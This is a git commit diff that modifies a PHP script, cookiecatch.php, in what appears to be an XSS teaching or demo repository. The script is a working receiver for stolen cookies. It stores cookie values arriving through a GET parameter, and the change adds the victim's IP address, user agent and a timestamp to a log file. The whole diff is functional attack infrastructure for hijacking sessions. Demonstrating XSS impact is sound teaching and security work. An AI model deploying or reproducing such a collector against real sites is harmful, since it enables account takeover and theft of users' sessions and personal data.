0d858b1218408baed68849306a34f24adc13812d
Gerifield <radics.gergely@ustream.tv>
2014-10-20 10:59:14 +0200

    Added cookie catch example

--- a3-xss/cookiecatch.php
+++ a3-xss/cookiecatch.php
@@ -2,7 +2,7 @@
 
 if(isset($_GET['cookies'])){
 	$saveFile = file_get_contents('cookies.txt');
-	$saveFile = $_GET['cookies']."\n";
+	$saveFile = $saveFile.$_GET['cookies']."|".date('Y-m-d H:i:s')."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."\n";
 	file_put_contents('cookies.txt', $saveFile);
 }else{
 	echo "Nope! :)";
